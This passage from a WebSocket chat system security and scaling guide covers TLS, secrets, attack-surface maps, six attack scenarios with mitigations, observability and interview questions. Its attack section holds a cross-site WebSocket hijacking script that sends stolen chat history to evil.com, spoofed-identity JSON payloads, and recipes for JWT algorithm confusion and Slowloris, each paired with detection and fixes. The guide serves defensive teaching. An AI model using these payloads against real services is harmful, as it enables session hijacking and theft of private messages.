- Cipher suite hardening: disable RC4, 3DES, export ciphers, NULL ciphers.
- Recommended cipher suites (TLS 1.3): `TLS_AES_256_GCM_SHA384`, `TLS_CHACHA20_POLY1305_SHA256`.
- HSTS (HTTP Strict Transport Security): `Strict-Transport-Security: max-age=31536000; includeSubDomains; preload` — tells browsers to never attempt plain HTTP.
- Certificate Transparency: ensure your certs are logged to CT logs and monitor for unauthorized issuance.

### 7.2 Encryption at Rest

- Database: Transparent Data Encryption (TDE) at the storage engine level (PostgreSQL: tablespace encryption; MySQL: InnoDB encryption; AWS RDS: encryption at rest using KMS).
- Redis: Redis itself doesn't encrypt data at rest. Rely on disk encryption (LUKS, AWS EBS encryption). Consider Redis 7.x with ACLs and TLS.
- Kafka: Kafka messages at rest: use encrypted disk volumes. Sensitive fields (e.g., message bodies if PII) can be application-layer encrypted before writing to Kafka.
- Backups: Always encrypt database backups with a separate key.

### 7.3 Input Validation

- **Reject on first failure.** Don't try to "fix" malformed input.
- **Schema validation:** Use a strict schema validator (Zod, Ajv, Joi). Define allowed fields explicitly; reject unknown fields (strip or error on `additionalProperties: false`).
- **String sanitization:** For content that will be rendered as HTML, sanitize server-side AND client-side. Use DOMPurify on the client. Use a server-side HTML sanitizer for stored content.
- **JSON depth limit:** Deeply nested JSON can cause stack overflows or exponential parsing time. Set `maxDepth: 20` in your JSON parser.
- **Payload size limit:** Enforce max frame size (e.g., 64KB) at the WebSocket server. Reject oversized messages before parsing.

### 7.4 Access Control

- **RBAC (Role-Based Access Control):** Users have roles; roles have permissions.
- **Room membership:** Checked on every message operation. Stored in DB, cached in Redis with a short TTL.
- **Admin endpoints:** Separate from user-facing endpoints. Behind additional auth (IP allowlist, separate JWT with `admin` scope, MFA-required session).
- **Server-to-server (internal):** mTLS (mutual TLS) — both client and server present certificates. Or a shared secret in an internal-only header (not routable from the internet).

### 7.5 Secrets Handling

- **Never hardcode secrets.** No API keys, DB passwords, or signing keys in source code.
- **Secrets manager:** AWS Secrets Manager, HashiCorp Vault, GCP Secret Manager.
- **Secrets injection:** Inject into process environment at deploy time, or fetch at startup from Vault.
- **JWT signing keys:**
  - Rotate signing keys on a schedule (90 days) and after any suspected compromise.
  - Use a JWKS (JSON Web Key Set) endpoint (`/.well-known/jwks.json`) so services can fetch the current public key. Implement key ID (`kid`) in JWT header so verifiers know which key to use.
  - Keep old keys active during rotation window to allow in-flight tokens to remain valid.
- **Audit key access:** Every time a service reads a secret from Vault, it should be logged.

---

## 8. Attack Surface Mapping

### 8.1 Entry Points

```
EXTERNAL ATTACK SURFACE
═══════════════════════════════════════════════════════════════════

  INTERNET
     │
     │  ┌─────────────────────────────────────────────────────┐
     ├──►  DNS (UDP/TCP 53)                                    │
     │  │  Attack: DNS hijacking, cache poisoning, DDoS        │
     │  └─────────────────────────────────────────────────────┘
     │
     │  ┌─────────────────────────────────────────────────────┐
     ├──►  HTTPS :443 (HTTP REST API)                         │
     │  │  - /api/auth/login         (credential submission)  │
     │  │  - /api/auth/refresh       (token refresh)          │
     │  │  - /api/messages           (REST CRUD)              │
     │  │  - /api/rooms              (room management)        │
     │  │  Attack: SSRF, SQLi, auth bypass, parameter tampering│
     │  └─────────────────────────────────────────────────────┘
     │
     │  ┌─────────────────────────────────────────────────────┐
     └──►  WSS :443 (WebSocket Upgrade at /ws)                │
        │  - Upgrade request         (auth at handshake)      │
        │  - Ongoing WS frames       (all user actions)       │
        │  Attack: CSWSH, flooding, injection, auth bypass     │
        └─────────────────────────────────────────────────────┘

INTERNAL ATTACK SURFACE (post-compromise or insider threat)
═══════════════════════════════════════════════════════════════════

  ┌──────────────┐    ┌──────────────┐    ┌──────────────┐
  │ WS Server    │────│ Auth Service │────│ Redis        │
  │ internal API │    │ internal API │    │ :6379        │
  └──────────────┘    └──────────────┘    └──────────────┘
         │                   │                   │
  ┌──────────────┐    ┌──────────────┐    ┌──────────────┐
  │ PostgreSQL   │    │ Kafka        │    │ Admin Panel  │
  │ :5432        │    │ :9092        │    │ :8080        │
  └──────────────┘    └──────────────┘    └──────────────┘

  Attack: lateral movement, SSRF from WS server to internal services,
          compromised Kafka consumer, Redis keyspace poisoning
```

### 8.2 Trust Boundary Map

```
┌─────────────────────────────────────────────────────────────────────┐
│  UNTRUSTED ZONE                                                      │
│                                                                      │
│  ┌──────────────────────────────┐                                   │
│  │  Browser / Mobile Client    │                                   │
│  │  - Any user can craft WS    │                                   │
│  │    frames with arbitrary    │                                   │
│  │    content                  │                                   │
│  │  - Cookie is automatically  │                                   │
│  │    attached (CSRF risk)     │                                   │
│  └───────────────┬──────────────┘                                   │
└──────────────────┼──────────────────────────────────────────────────┘
                   │  TRUST BOUNDARY 1: TLS + Auth token validation
                   ▼
┌─────────────────────────────────────────────────────────────────────┐
│  DMZ ZONE                                                            │
│                                                                      │
│  ┌──────────────────────────────┐                                   │
│  │  API Gateway / Load Balancer│                                   │
│  │  - Enforces TLS             │                                   │
│  │  - Rate limits              │                                   │
│  │  - WAF rules                │                                   │
│  └───────────────┬──────────────┘                                   │
└──────────────────┼──────────────────────────────────────────────────┘
                   │  TRUST BOUNDARY 2: Internal network, no public routing
                   ▼
┌─────────────────────────────────────────────────────────────────────┐
│  TRUSTED APPLICATION ZONE                                            │
│                                                                      │
│  WS Servers ←→ Auth Service ←→ REST APIs                            │
│  (internal calls: service tokens or mTLS)                           │
│                                                                      │
│  TRUST BOUNDARY 3: Credentials required for data access             │
│                    ▼                                                 │
│  Redis  ←──── Kafka ←──── PostgreSQL                                │
│  (no public access; VPC/firewall protected)                          │
└─────────────────────────────────────────────────────────────────────┘
```

---

## 9. Attack Scenarios

### Attack 1: Cross-Site WebSocket Hijacking (CSWSH)

**Category:** Authentication bypass via CSRF  
**Attacker assumptions:** The target user is logged in to `chat.example.com`. The attacker controls a separate web page (`evil.com`). The WebSocket endpoint authenticates via session cookie.

**Step-by-step execution:**

1. Attacker hosts a page at `https://evil.com/attack.html`:
```html
<script>
  const ws = new WebSocket("wss://chat.example.com/ws");
  ws.onopen = () => {
    ws.send(JSON.stringify({ type: "getHistory", roomId: "room_1" }));
  };
  ws.onmessage = (e) => {
    // Exfiltrate message history to attacker server
    fetch("https://evil.com/collect", { method: "POST", body: e.data });
  };
</script>
```
2. Victim visits `https://evil.com/attack.html` (via phishing, ad, etc.).
3. The browser opens a WebSocket to `chat.example.com/ws`.
4. The browser automatically attaches the `chat.example.com` session cookie to the upgrade request.
5. The server sees a valid session cookie and upgrades the connection.
6. The attacker's JavaScript now has a WebSocket connection authenticated as the victim.
7. The attacker reads the victim's chat history, sends messages as the victim, etc.

**Why this works:** WebSocket upgrade requests follow the same cookie-sending rules as regular HTTP requests. No `SameSite` enforcement by default prevents this (only `SameSite=Strict` does, and it breaks some OAuth flows).

**Where detection could happen:**
- Server-side: Compare the `Origin` header to an allowlist. If `Origin: https://evil.com`, reject with 403.
- SIEM: Alert on `Origin` header values that are not in the allowlist.

**Why Origin-checking works:** Unlike other headers, the `Origin` header on WebSocket upgrades cannot be forged by JavaScript in the browser — it is set by the browser itself.

---

### Attack 2: WebSocket Message Injection / Framing Attack

**Category:** Logic abuse / input validation bypass  
**Attacker assumptions:** Authenticated user. The application uses a weak type system or trusts client-provided fields.

**Step-by-step execution:**

1. Attacker opens a legitimate WebSocket connection, authenticates normally.
2. Instead of using the application's UI, attacker uses `wscat` or a custom script to send crafted frames.
3. Attacker sends:
```json
{ "type": "sendMessage", "roomId": "room_private_admin", "body": "exfiltrate" }
```
4. If the server does not verify room membership on every message (only at connection time), the message is delivered.
5. Alternatively, attacker injects:
```json
{ "type": "deleteRoom", "roomId": "room_42", "senderId": "admin_user_id" }
```
6. If `senderId` is taken from the payload instead of the validated token, this bypasses authorization.

**Why this works:** Weak or missing per-message authorization. Trusting client-supplied identity fields.

**Where detection could happen:**
- Application logs showing messages to rooms the user is not a member of.
- Anomaly detection on unusual message types from non-admin users.

**Mitigation:** Never take identity fields from the payload. Always derive `senderId`, `userId`, `roles` from the validated JWT/session. Validate room membership on every `sendMessage` operation.

---

### Attack 3: Denial of Service via WebSocket Flood

**Category:** Availability attack  
**Attacker assumptions:** Attacker has or can obtain valid credentials. Can run scripts from multiple IPs (botnet, residential proxies).

**Step-by-step execution:**

1. Attacker creates N WebSocket connections (one per thread/worker in script).
2. Each connection authenticates with a valid (possibly compromised) credential.
3. Each connection sends the maximum allowed messages per second.
4. Server's per-user rate limit allows 10 msg/sec. With 100 connections from 100 accounts: 1000 msg/sec.
5. The message handler, DB writes, Redis pub/sub, and fan-out workers are all saturated.
6. Legitimate users experience message delays, delivery failures, and timeouts.
7. Alternatively: send max-size messages (64KB each). 1000 msg/sec × 64KB = 64MB/sec of traffic to parse and write.

**Why this works:** Rate limiting is often per-user or per-IP, but not per-system. WebSocket connections are cheap to maintain (especially for the attacker), and message processing is expensive for the server.

**Where detection could happen:**
- Metrics: message processing latency spike.
- Kafka consumer lag growing (producers outpacing consumers).
- Redis memory growing unexpectedly.
- Alert: single IP or ASN opening more than N connections.

**Mitigation:** Per-IP connection limits. Per-user and per-room message rate limits. Message size hard cap. Global throughput limits with circuit breakers. CAPTCHAs or proof-of-work for new account WebSocket connections.

---

### Attack 4: JWT Algorithm Confusion Attack

**Category:** Authentication bypass  
**Attacker assumptions:** Server uses RS256 (asymmetric). Server's public key is accessible (standard — it's meant to be public, served at `/jwks.json`).

**Step-by-step execution:**

1. Attacker fetches `https://chat.example.com/.well-known/jwks.json` and obtains the server's RSA public key.
2. If the server's JWT verification code accepts `alg` from the JWT header without restriction, attacker crafts a malicious JWT:
   - Set `alg: "HS256"` in the header.
   - Sign the JWT with the RSA **public key** as the HMAC secret.
3. The confused server, seeing `alg: HS256`, uses the RSA public key as the HMAC secret for verification.
4. Since the attacker signed with that same public key, the signature is valid.
5. Attacker can put any claims in the payload: arbitrary `sub`, `roles: ["admin"]`, etc.

**Why this works:** The vulnerability is in the JWT library accepting the algorithm from the token header rather than having it hardcoded on the server. The public key is public — the attacker can use it as an HMAC key.

**Where detection could happen:**
- Hard to detect — the request looks like a legitimately signed token.
- Monitor for tokens with unexpected `alg` values in your logs.

**Mitigation:** Always specify the expected algorithm explicitly in your verification call. `jwt.verify(token, publicKey, { algorithms: ['RS256'] })`. Never accept `none` algorithm.

---

### Attack 5: Slowloris / Slow WebSocket Attack

**Category:** Resource exhaustion  
**Attacker assumptions:** Can open TCP connections to the server.

**Step-by-step execution:**

1. Attacker opens thousands of TCP connections to port 443.
2. For each: sends a valid HTTP request line and the `Upgrade: websocket` header.
3. Then sends headers one byte at a time, extremely slowly (1 byte every 10 seconds).
4. The server holds the connection open waiting for the complete headers, since it hasn't received a complete HTTP request yet.
5. Server's max connections or connection table fills up.
6. Legitimate users cannot connect.

**Why this works:** HTTP servers must wait for a complete request before processing. Slow sending keeps connections open indefinitely without fully establishing them.

**Where detection could happen:**
- Connection duration histogram showing many connections in the "upgrading" state for >30s.
- Number of half-open connections approaching server limit.

**Mitigation:** Request header timeout (e.g., nginx `client_header_timeout 10s`). Max connection limits per IP. Connection rate limiting at the load balancer.

---

### Attack 6: Man-in-the-Middle via TLS Misconfiguration

**Category:** Interception / data theft  
**Attacker assumptions:** On-path attacker (corporate proxy, rogue Wi-Fi access point). Target application accepts weak TLS configurations.

**Step-by-step execution:**

1. Target app accepts TLS 1.0 or supports weak cipher suites (e.g., RC4, CBC without proper MAC-then-encrypt).
2. Attacker positions between client and server (evil Wi-Fi AP, ARP spoofing on LAN).
3. Attacker negotiates a downgraded TLS version with the server.
4. Uses BEAST (TLS 1.0 CBC), POODLE (SSL3/TLS1.0 CBC), or SWEET32 (3DES) to decrypt traffic.
5. All WebSocket message contents are now readable.

**Why this works:** Weak cipher suites and old TLS versions have known cryptographic weaknesses.

**Mitigation:** TLS 1.2+ only. Disable CBC cipher suites (or use only those with AEAD like AES-GCM). Enable HSTS. Regular TLS configuration audits (Qualys SSL Labs, testssl.sh). Certificate pinning in mobile apps.

---

## 10. Failure Points

### 10.1 Failures Under Load

| Component | Failure Mode | Symptoms | Root Cause |
|-----------|-------------|----------|------------|
| WebSocket Server | Memory exhaustion | OOM kill, crash | Too many open connections (each costs ~10–50KB RAM) |
| Redis Pub/Sub | Message loss | Users miss messages | Redis single-threaded; can't keep up with publish rate |
| Kafka consumers | Growing lag | Delayed delivery | Consumer slower than producer; needs more partitions/consumers |
| PostgreSQL | Connection pool exhaustion | "too many connections" errors | N WS servers × M connections each > DB max_connections |
| Load Balancer | Sticky session overload | Hot nodes | WebSocket sessions pinned to one server unevenly |
| Redis (session store) | Hot key | Latency spike on popular room | All operations for popular room hit one Redis slot |

### 10.2 Failures Under Attack

| Attack | Failure Mode |
|--------|-------------|
| Connection flood | Ephemeral port exhaustion (65535 port limit per IP) |
| Message flood | Kafka partition saturation; worker backpressure cascades |
| JWT replay | Revocation list (Redis) can become a hot key under load |
| Large message flood | JSON parsing CPU spike; GC pressure in Node.js |
| Malformed UTF-8 in text frames | Crash in naive parsers; DoS |

### 10.3 Common Misconfigurations

1. **`ping_interval` not configured:** No heartbeat → zombie connections accumulate. Server thinks clients are alive; resources not freed.
2. **`max_message_size` not set:** Default in many libraries is unbounded. A 1GB message will be accepted and parsed.
3. **`Origin` validation skipped:** "We check the JWT so it's fine" — not fine for CSWSH.
4. **HTTP load balancer without sticky sessions:** WebSocket connection lands on Server A; subsequent state queries (not on that server) fail or require a round-trip to Redis.
5. **`ws://` allowed in development:** Developers test with ws:// and inadvertently enable it in staging. Cleartext WebSocket traffic is trivially readable.
6. **Error messages expose internals:** `Error: relation "users" does not exist` sent back in WebSocket error frames. Reveals DB schema.
7. **Not closing unauthenticated connections:** Accepting the WebSocket upgrade, then waiting indefinitely for auth. Attackers hold slots.
8. **Redis without AUTH:** Redis on a private network but without password. Lateral movement allows direct keyspace manipulation.
9. **`permessage-deflate` without limits:** Zip bomb in compressed WebSocket message expands to massive size after decompression.

---

## 11. Mitigations

### 11.1 WebSocket-Specific

| Threat | Mitigation | Engineering Tradeoff |
|--------|-----------|---------------------|
| CSWSH | Validate `Origin` header against allowlist | Must maintain allowlist; breaks misconfigured clients |
| Auth token in query param | Use short-lived WS ticket (< 60s TTL, single-use) issued just before upgrade | Extra roundtrip to get ticket; adds latency |
| Connection flood | Per-IP connection limits at load balancer; CAPTCHA for new users | Breaks NAT'd users sharing an IP; false positives |
| Message flood | Per-user token bucket rate limiter (Redis INCR + EXPIRE) | Must choose right limits; throttles legitimate bursts |
| Large messages | Server-side max frame size; reject before parse | Some legitimate use cases need large payloads; tune carefully |
| Zombie connections | Heartbeat + PING/PONG timeout (30–60s) | Too short: breaks high-latency mobile clients |
| JWT algorithm confusion | Pin algorithm in verify call | None — always do this |
| Unauthed connection slots | Close connection if auth not received within 5s | Mobile clients on slow networks may need more time |
| Zip bomb in permessage-deflate | Set `max_message_size` after decompression | None — always configure this |

### 11.2 Defense-in-Depth Strategy

```
LAYER 1: NETWORK
  - DDoS scrubbing (Cloudflare Magic Transit, AWS Shield)
  - Rate limiting at edge (connection rate, bandwidth)
  - Geo-blocking if applicable

LAYER 2: TRANSPORT
  - TLS 1.3 only, AEAD ciphers only
  - HSTS with preloading
  - Certificate pinning (mobile)
  - OCSP stapling

LAYER 3: APPLICATION GATEWAY
  - WAF with WebSocket-aware rules
  - Per-IP connection limits
  - Request rate limiting
  - Bot detection (JS challenge)

LAYER 4: APPLICATION (WebSocket Server)
  - Origin validation
  - Strong auth (JWT RS256, short expiry)
  - Per-user and per-room rate limiting
  - Input schema validation
  - Per-message authorization
  - Max message size enforcement
  - Heartbeat enforcement

LAYER 5: DATA
  - Parameterized queries (no SQL injection)
  - Encrypted at rest
  - DB-level access controls
  - Redis AUTH + TLS

LAYER 6: OPERATIONS
  - Secrets in Vault (not env vars committed to git)
  - Key rotation
  - Least privilege IAM
  - Audit logs for all sensitive operations
  - Regular pen testing
```

---

## 12. Observability

### 12.1 Logs

**What to log (structured JSON):**

```json
// WebSocket connection log
{
  "event": "ws_connect",
  "timestamp": "2024-01-15T10:23:45.123Z",
  "socket_id": "sock_abc123",
  "user_id": "u_456",
  "ip": "203.0.113.1",
  "user_agent": "Mozilla/5.0...",
  "origin": "https://chat.example.com",
  "server_id": "ws-server-3"
}

// Message received log
{
  "event": "ws_message_received",
  "socket_id": "sock_abc123",
  "user_id": "u_456",
  "message_type": "sendMessage",
  "room_id": "room_42",
  "message_id": "msg_789",
  "payload_size_bytes": 128,
  "processing_ms": 3
}

// Auth failure log
{
  "event": "ws_auth_failed",
  "ip": "203.0.113.1",
  "reason": "token_expired",
  "token_sub": "u_456",
  "token_exp": 1698400000
}
```

**What NOT to log:**
- Message body content (privacy, PII).
- JWT tokens in full (log only `sub` and `jti` claims).
- Passwords, secrets, PII fields.
- High-frequency heartbeat frames (log connection events, not individual PINGs).

### 12.2 Metrics (Prometheus / StatsD)

| Metric | Type | Alert Threshold |
|--------|------|----------------|
| `ws_connections_active` | Gauge | > 80% of configured max |
| `ws_connections_per_second` | Counter | > 3× baseline |
| `ws_message_rate` | Counter | Per user/room: > rate limit |
| `ws_message_processing_p99_ms` | Histogram | > 500ms |
| `ws_upgrade_failures_total` | Counter | > 1% of upgrade attempts |
| `ws_auth_failures_total` | Counter | > 100/min from single IP |
| `kafka_consumer_lag` | Gauge | > 10,000 messages |
| `redis_pub_sub_publish_rate` | Counter | > 100K/sec (tune per capacity) |
| `db_connection_pool_exhaustion` | Counter | Any occurrence |
| `jwt_validation_failures_total` | Counter | > 50/min |

### 12.3 Distributed Tracing (OpenTelemetry)

Trace context should propagate from the WebSocket upgrade through to every downstream service call:

```
Trace: ws_message_send
│
├── Span: ws_receive_frame (WS Server)
│   Attributes: socket_id, user_id, message_type
│
├── Span: authorize_message (WS Server)
│   Attributes: room_id, user_id, result
│
├── Span: db_insert_message (PostgreSQL)
│   Attributes: table, query_type, duration_ms
│
├── Span: kafka_publish (Kafka Producer)
│   Attributes: topic, partition, offset
│
└── Span: ws_fanout (Workers)
    Attributes: recipient_count, failed_deliveries
```

### 12.4 Alerting Philosophy

**Alert on:**
- Auth failure rate spike (brute force / credential stuffing)
- Unusual origin headers in WebSocket upgrade requests
- Message processing P99 latency > threshold (performance degradation)
- Consumer lag growing (data pipeline falling behind)
- Certificate expiry < 30 days (use cert-manager or automated rotation)
- Any error from secrets manager (may indicate rotation failure or breach)
- New IP range suddenly opening many connections

**Do NOT alert on (high noise, low signal):**
- Individual WebSocket disconnects (normal — mobile networks are flaky)
- Individual rate-limit hits (normal user behavior)
- Single JWT expiry events (continuous background noise)
- Heartbeat timeouts on known mobile subnets

---

## 13. Scaling Considerations

### 13.1 The Fundamental Challenge: Stateful WebSockets

HTTP is stateless — any server can handle any request. WebSocket is stateful — each server holds live socket objects in memory. This breaks naive horizontal scaling.

**Solutions:**

1. **Sticky sessions (session affinity):** Load balancer routes a client to the same server every time based on IP hash or session cookie. Simple but creates hotspots and complicates deployment (can't freely terminate a server without disconnecting users).

2. **Redis Pub/Sub fan-out (most common):** Each server subscribes to Redis channels for its connected users' rooms. Messages published to Redis are fanned out to the correct server. Servers are now interchangeable — any server can handle new connections.

3. **Dedicated fan-out service:** Instead of each WS server subscribing to Redis, a separate fan-out service knows which socket is on which server and routes messages directly. More complex, more scalable.

4. **QUIC / HTTP/3:** WebSocket over HTTP/3 (RFC 9220) can multiplex connections over QUIC streams. QUIC handles connection migration (phone switching from Wi-Fi to LTE without reconnect). Reduces load from reconnections.

---

### 13.2 Bottlenecks

| Component | Bottleneck | Scale Solution |
|-----------|-----------|----------------|
| WS Server | Memory per connection (~30KB × 100K = 3GB) | Horizontal scale; ulimit tuning; epoll/kqueue for efficient I/O |
| Redis Pub/Sub | Single Redis node, single thread | Redis Cluster (shard channels by room ID); use Kafka for high-volume fan-out |
| Kafka | Partition count limits parallelism | Increase partitions; partition by room_id for ordering |
| PostgreSQL | Write throughput | Connection pooling (PgBouncer); read replicas; partition tables; time-series DB |
| DB Connection Pool | WS server × connections > DB max_connections | PgBouncer for connection multiplexing |

### 13.3 Horizontal vs Vertical Scaling

| Scenario | Horizontal | Vertical |
|----------|-----------|----------|
| More concurrent connections | ✅ Add WS server nodes | ✅ More RAM per node (limited) |
| More messages per second | ✅ More Kafka consumers/partitions | ✅ Faster CPU (limited) |
| More rooms | ✅ Shard rooms across Redis clusters | Limited benefit |
| Large single room (100K users) | Complex — all subs on all servers | ✅ Single large server (temporary) |

### 13.4 Consistency Tradeoffs

- **Message ordering:** Within a room, messages should be ordered. Kafka partitioned by room_id guarantees ordering within a partition. Multiple producers to the same partition can cause out-of-order delivery — use a single producer per partition or Kafka transactions.
- **Presence (online/offline status):** Eventual consistency is acceptable. Use Redis EXPIRE + Pub/Sub. A user may appear online for up to TTL seconds after disconnect.
- **Read-your-own-writes:** After sending a message, the client should immediately see it (achieved by optimistic UI on the client). The server acknowledgment confirms persistence.
- **At-least-once vs exactly-once:** Kafka default is at-least-once delivery. Duplicate messages are possible if a consumer crashes after processing but before committing offset. Use idempotency keys (message_id) in consumers to deduplicate.

---

## 14. Interview Questions

### Q1: Why can't you just use HTTP polling instead of WebSockets?
**Answer:** HTTP polling (short or long) requires the client to continuously initiate new HTTP requests. Each request has TCP + TLS overhead (mitigated by HTTP keep-alive, but not eliminated). Long-polling holds a connection open until the server has data, then closes it — the client must immediately open a new connection. This creates latency spikes (the reconnect RTT), wastes connections, and is inefficient at scale. WebSocket maintains a single persistent connection. The server can push data at any time with no round-trip overhead. At 10K concurrent users, HTTP long-polling requires 10K simultaneous HTTP connections on the server; WebSocket also requires 10K connections but they're cheaper (no HTTP request/response parsing on each message, no reconnect storms). **What if the client is behind a proxy that doesn't support WebSocket?** Use fallback to Server-Sent Events (SSE, HTTP/2 streaming) or long-polling — Socket.IO implements this negotiation automatically.

### Q2: What happens if the load balancer doesn't support WebSocket sticky sessions and you don't use Redis Pub/Sub?
**Answer:** Without sticky sessions, the HTTP upgrade request may land on Server A. Subsequent messages are part of the established WebSocket connection on Server A — so they're fine. But any messages destined for that client from other users must reach Server A specifically. If Server B receives a publish event for a room and the target client is on Server A, Server B has no socket object for that client — the message is silently dropped. Without a cross-server mechanism (Redis Pub/Sub, Kafka), only users connected to the same server as the sender receive messages. This is why Redis Pub/Sub is the standard pattern — every server subscribes to relevant channels and fans out to its local sockets.

### Q3: Explain the `Sec-WebSocket-Key` / `Sec-WebSocket-Accept` handshake. Does it provide security?
**Answer:** No, it provides no security. The key is a random 16 bytes base64-encoded. The server computes `Base64(SHA1(key + magic_guid))`. The client verifies the response. The purpose is to prevent confusion: a generic HTTP server that doesn't understand WebSocket but caches responses would see the `101` response and try to cache it — the key derivation ensures only a WebSocket-aware server can produce the correct response. It prevents accidental caching by intermediaries. Security comes entirely from TLS — the `Sec-WebSocket-Key` mechanism is only an anti-confusion measure.

### Q4: How do you handle WebSocket reconnections without losing messages?
**Answer:** This requires a client-side sequence number and server-side message buffering. The client tracks the last message sequence number it received (or message timestamp). On reconnect, it sends `{ lastSeq: 42 }` in the auth handshake. The server queries Kafka (by offset) or the DB for all messages after sequence 42 and replays them. Kafka is ideal here — Kafka retains messages for a configurable retention period (days/weeks). The server tracks the consumer offset per room per client. On reconnect, it resumes from the stored offset. The client must also handle duplicate detection (messages delivered twice: once before disconnect, once in replay) using the message_id as an idempotency key.

### Q5: What is CSWSH and how is it different from CSRF?
**Answer:** Classic CSRF attacks forge HTTP requests (e.g., form submissions) that trigger state changes. The same-origin policy prevents reading the response, but the request fires. CSWSH (Cross-Site WebSocket Hijacking) is similar but establishes a persistent WebSocket connection. Because WebSocket upgrades send cookies, a cross-origin WebSocket from an attacker's page can authenticate as the victim. Unlike HTTP CSRF (where the attacker can't read the response due to same-origin policy), a WebSocket connection gives the attacker's JavaScript bidirectional read/write access — the attacker can read all messages the victim receives. Mitigation: `Origin` header validation (the browser sets this; JS cannot override it) + CSRF tokens embedded in the upgrade URL or first message.

### Q6: Why is 0-RTT TLS resumption dangerous for WebSocket connections?
**Answer:** TLS 1.3 0-RTT allows a client to send application data in the first TLS flight using a Pre-Shared Key from a previous session. This data has no replay protection — a network attacker can capture the first-flight data and re-send it to the server. For a WebSocket upgrade, the first-flight data includes the upgrade HTTP request and any tokens in the query string. An attacker who captures this can replay it: opening a new WebSocket connection authenticated as the victim. The server would accept it as valid (correct signature, valid PSK). Mitigation: disable 0-RTT for WebSocket upgrade endpoints, or include a timestamp/nonce in the upgrade request and validate server-side that it's fresh (within N seconds).

### Q7: You're seeing high Kafka consumer lag on the message fanout topic. What do you investigate and in what order?
**Answer:** 
1. Is it one partition or all partitions? If one: check the consumer handling that partition — it may be slow due to a specific room with many recipients (N×M fan-out explosion). If all: the consumer fleet is undersized.
2. Check consumer CPU and memory. If CPU is pegged: the fan-out logic itself is slow (maybe iterating a large room membership list in Redis per message).
3. Check Redis latency. Fan-out requires a Redis read per message (room → socket list). If Redis is slow, every message stalls.
4. Check the network: are WebSocket sends blocking? If recipient sockets have full send buffers (slow client), the `socket.send()` call blocks, which blocks the consumer.
5. Solution: increase Kafka partitions (more parallelism); increase consumer replicas; make fan-out async (don't block on `socket.send()` — use non-blocking writes with back-pressure); cache room membership in local process memory with a short TTL.

### Q8: How do you implement per-room authorization without a database roundtrip on every message?
**Answer:** Cache room membership in Redis. On connection establishment (or first join), load the user's room memberships and cache them: `SADD user:{userId}:rooms room_1 room_42 room_99` with a 5-minute TTL. On each message, check `SISMEMBER user:{userId}:rooms {roomId}` — this is a O(1) Redis operation taking ~0.1ms. On membership change events (user kicked, room deleted), invalidate the cache via Pub/Sub: publish `{ type: "cache_invalidate", userId, roomId }` and each WS server's listener clears its local in-process cache too. For ultra-low-latency paths, maintain a local in-process LRU cache (e.g., node-lru-cache with 30-second TTL) checked before Redis — this eliminates network I/O entirely for hot paths, at the cost of slightly stale authorization (up to 30s window where a kicked user can still send messages).

### Q9: What happens at the network level when a WebSocket connection crosses a TCP-aware proxy?
**Answer:** Many corporate proxies and some CDN configurations are HTTP-aware but not WebSocket-aware. When the client sends an HTTP `CONNECT` or an `Upgrade: websocket` request, the proxy may: (a) strip the `Connection: Upgrade` header (HTTP/1.1 hop-by-hop headers are not forwarded), causing the upgrade to fail; (b) timeout the connection if it expects HTTP request/response cycles and sees the connection idle (no HTTP keep-alive traffic); (c) buffer the entire response before forwarding it (breaking streaming). Mitigations: use `wss://` on port 443 (HTTPS port) — most proxies pass through TLS-tunneled traffic (CONNECT method) without inspecting it. Instruct the proxy to pass through WebSocket upgrades. As a last resort, fall back to HTTP long-polling through the proxy.

### Q10: How do you implement WebSocket graceful shutdown without losing messages during a deployment?
**Answer:** This is a crucial operational problem. Naive shutdown: `process.exit()` drops all connections and in-flight messages. Graceful shutdown:
1. Receive SIGTERM.
2. Stop accepting new WebSocket connections (remove from load balancer health check → LB stops routing new connections here, existing connections remain).
3. Publish a `{ type: "server_drain", reconnect_after: 5 }` message to all connected clients. Clients start their reconnect timers.
4. Wait for all in-flight message processing to complete (pending DB writes, Kafka publishes).
5. Close all WebSocket connections with code 1001 (Going Away).
6. Flush remaining Kafka producer messages.
7. Disconnect from Redis.
8. `process.exit(0)`.
The key is step 2 (drain from LB) + step 4 (wait for in-flight). Most orchestrators (Kubernetes) send SIGTERM and then wait `terminationGracePeriodSeconds` (default 30s) before SIGKILL — ensure your drain completes within that window. Set `terminationGracePeriodSeconds` to a value that accounts for your longest expected in-flight operation.

### Q11: A user reports they stop receiving messages after exactly 60 seconds of inactivity. What is the issue?
**Answer:** Classic heartbeat/timeout misconfiguration. Multiple candidates:
1. **Load balancer idle timeout:** AWS ALB default idle timeout is 60 seconds. If no data is exchanged for 60s, the ALB closes the connection with a TCP RST — the client receives an unexpected close. Fix: increase ALB idle timeout to 3600s for WebSocket paths, or configure the server to send PING frames every 30s.
2. **nginx `proxy_read_timeout`:** If nginx is proxying to the WS server, `proxy_read_timeout` defaults to 60s. After 60s of no upstream data, nginx closes the connection. Fix: set `proxy_read_timeout 3600s` for WebSocket `location` blocks.
3. **Server-side idle timeout:** The WS server itself may have a 60s inactivity timeout. Fix: configure heartbeat interval to be shorter than the timeout.
Root cause diagnosis: check if the close is a clean close (code 1000/1001) or abnormal (1006 = TCP RST, no close frame sent). Code 1006 points to an infrastructure timeout (LB or proxy). A clean code from the server points to application-level timeout logic.

### Q12: How would you design a system where one room has 1 million concurrent users (e.g., a live event)?
**Answer:** Standard fan-out doesn't scale to 1M recipients per message. Standard Redis Pub/Sub means every WS server subscribes to the same channel and sends to its local sockets — fine. But the publisher sending to Redis once triggers 1M sends across all servers, which is fine. The bottleneck is: each WS server must send the message to all its local sockets. If you have 100 WS servers, each handles 10K sockets; sending to 10K sockets is fast. The real problem is the number of WebSocket servers needed: at ~50K concurrent connections per server (memory-limited), 1M users needs ~20 servers. Fan-out latency: Redis Pub/Sub delivers to all 20 servers near-simultaneously; each server fans out to its 50K sockets. Socket.send() with 50K recipients takes time — use Node.js streams, batched writes, or binary fan-out. Consider: (1) CDN-based push (Cloudflare Durable Objects, Ably, Pusher) for massive fan-out; (2) SSE over HTTP/2 (multiplexed, server-push, simpler than WebSocket for broadcast-only channels); (3) Hierarchical fan-out (a message goes to 20 regional aggregator servers, each fans out to 50 edge servers, each fans out to 1K users) — message reaches all in log(N) hops.

---

*End of document. This breakdown represents a production-grade system at the level expected of a senior distributed systems / security engineer.*
